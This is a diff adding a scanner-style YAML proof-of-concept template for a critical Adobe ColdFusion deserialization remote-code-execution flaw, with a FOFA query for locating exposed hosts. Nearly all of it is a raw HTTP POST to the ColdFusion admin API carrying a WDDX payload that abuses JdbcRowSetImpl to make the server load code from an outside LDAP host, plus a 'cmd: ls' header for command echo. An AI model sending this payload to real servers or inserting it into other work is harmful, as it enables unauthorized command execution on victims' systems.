@@ -1,0 +1,45 @@
+id: poc-ixb5gksesmnfyl1f
+info:
+  name: Adobe ColdFusion 反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ixb5gksesmnfyl1f'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ixb5gksesmnfyl1f
+    fofa: app="Adobe-ColdFusion"
+http:
+- raw:
+  - 'POST /CFIDE/adminapi/base.cfc?method= HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    cmd: ls
+
+
+
+
+    argumentCollection=<wddxPacket+version%3d''1.0''><header/><data><struct+type%3d''xcom.sun.rowset.JdbcRowSetImplx''><var+name%3d''dataSourceName''><string>ldap://www.baidu.com/Basic/TomcatEcho</string></var><var+name%3d''autoCommit''><boolean+value%3d''true''/></var></struct></data></wddxPacket>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
